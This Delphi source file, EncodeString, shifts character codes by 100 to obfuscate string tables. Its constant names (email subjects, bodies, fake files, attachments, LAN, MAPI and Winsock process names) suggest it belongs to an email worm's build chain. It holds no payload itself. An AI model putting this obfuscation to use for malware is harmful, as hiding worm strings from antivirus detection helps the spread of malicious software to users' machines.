PROGRAM EncodeString;

CONST
  CRLF = #10#13;

VAR
  ISTR : STRING;

FUNCTION ReadStr(FileName:STRING) : STRING;
VAR
  F : TextFile;
  S : STRING;
  K : STRING;
  U : WORD;
BEGIN
  AssignFile(F,FileName);
  Reset(F);
  Readln(F,S);
  Delete(S,1,1);
  RESULT:=S;
  K:='';
  REPEAT
    Readln(F,S);
    Delete(S,1,Pos('=',S));
    K:=K+S+',';
  UNTIL EOF(F);
  CloseFile(F);
  Delete(K,Length(K),1);
  REPEAT
    U:=POS('+CRLF+CRLF+',K);
    IF U>0 THEN BEGIN
      DELETE(K,U-1,13);
      Insert(#13+#10+#13+#10,k,U-1);
    END;
  UNTIL POS('+CRLF+CRLF+',K)=0;
  IF K[Length(K)]=',' THEN Delete(K,Length(K),1);
  ISTR:=K;
{  AssignFile(F,filename+'.1');
  Rewrite(F);
  write(f,k);
  closefile(f);}
END;

PROCEDURE Encode(FileName:STRING);
VAR
  F : TextFile;
  I : WORD;
  S : STRING;
  O : BYTE;
  T : BYTE;
  B : STRING;
BEGIN
  B:=ReadStr(FileName+'.str');
  AssignFile(F,FileName+'.ini');
  ReWrite(F);
  WriteLn(F,'CONST');
  WriteLn(F,'  '+B+' : pChar = ');
  Write(F,'                    ');
  O:=0;
  FOR I:=1 TO Length(ISTR) DO BEGIN
    Inc(O);
    T:=Ord(ISTR[I])+100;
    Str(T,S);
    IF Length(S)=1 THEN S:='00'+S;
    IF Length(S)=2 THEN S:='0'+S;
    S:='#'+S+'+';
    IF O=12 THEN BEGIN
      O:=0;
      S:=S+CRLF+'                    ';
    END;
    IF I<Length(ISTR) THEN Write(F,S)
    ELSE BEGIN
      SetLength(S,4);
      Write(F,S+';');
    END;

  END;
  CloseFile(F);
END;

BEGIN
  Encode('TUSER32PROCESS');
  Encode('TADDON');
  Encode('TATTACHMENTS');
  Encode('TBODYS');
  Encode('TERRORMESSAGES');
  Encode('TEXTENSIONS1');
  Encode('TEXTENSIONS2');
  Encode('TFAKEFILES');
  Encode('TKERNEL32PROCESS');
  Encode('TLAN');
  Encode('TMAIN');
  Encode('TMAPIPROCESS');
  Encode('TSUBJECTS');
  Encode('TWINSOCKETPROCESS');
END.

